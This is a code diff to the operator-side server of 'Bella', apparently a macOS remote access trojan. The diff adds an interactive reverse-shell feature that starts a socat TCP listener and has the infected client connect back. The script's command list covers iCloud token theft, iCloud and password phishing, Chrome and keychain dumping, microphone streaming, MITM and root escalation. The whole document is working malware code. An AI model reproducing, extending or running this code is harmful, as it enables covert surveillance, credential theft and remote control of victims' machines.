@@ -28,8 +28,9 @@ purple = '\033[0;35m'
 redX = "%s[x] %s" % (red, endC)
 greenCheck = "%s[+] %s" % (green, endC)
 bluePlus = "%s[*] %s" % (blue, endC)
+yellow_star = "%s[*] %s" % (yellow, endC)
 
-commands = ['iCloud_query', 'set_client_name', 'update_server', 'upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
+commands = ['iCloud_query', 'set_client_name', 'update_server', 'interactive_shell','upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
 
 def subprocess_cleanup(subprocess_list):
     if len(subprocess_list) > 0:
@@ -166,6 +167,7 @@ def main():
         os.system('openssl req -x509 -nodes -days 365 -subj "/C=US/ST=Bella/L=Bella/O=Bella/CN=bella" -newkey rsa:2048 -keyout %sserver.key -out %sserver.crt' % (helperpath, helperpath)) 
     clear()
     port = 4545
+    interactive_shell_port = 3818
     print '%s%s%s%s' % (purple, bold, 'Listening for clients over port [%s]'.center(columns, ' ') % port, endC)
 
     sys.stdout.write(blue + bold)
@@ -347,6 +349,11 @@ def main():
                         (keychainName, keychainData) = pickle.loads(x) #[keychainName, keychainData]
                         downloader(keychainData, keychainName, client_log_path, client_name, 'Keychains')
 
+                elif data.startswith('interactive_shell_init'):
+                    while socat_PID.poll() == None: #it is alive
+                        time.sleep(1) #just wait a bit, check again.
+                    print '%sInteractive shell closed. Welcome back to Bella.' % bluePlus
+
                 elif data.startswith('appleIDPhishHelp'):
                     content = pickle.loads(data[16:])
                     if len(content[0]) > 0:
@@ -462,6 +469,19 @@ def main():
                         else:
                             print "Not deleting server."
                             nextcmd = ""
+
+                    if nextcmd == "interactive_shell":
+                        if platform.system() == 'Linux':
+                            print 'This function is not yet available for Linux systems.'
+                        else:
+                            print "%sStarting interactive shell over port [%s].\n%sPress CTRL-D *TWICE* to close.\n%sPre-built Bella functions will not work in this shell.\n%sUse this shell to run commands such as sudo, nano, telnet, ftp, etc." % (bluePlus, interactive_shell_port, bluePlus, yellow_star, bluePlus)
+                            socat_PID = subprocess.Popen("socat -s `tty`,raw,echo=0 tcp-listen:%s" % interactive_shell_port, shell=True) #start listener
+                            time.sleep(.5)
+                            if socat_PID.poll():
+                                print "%sYou need to install 'socat' on your Control Center to use this feature.\n" % redX
+                                nextcmd = ""
+                            else:
+                                nextcmd = "interactive_shell:::%s" % interactive_shell_port
 
                     if nextcmd == "cls":
                         file_list = commands
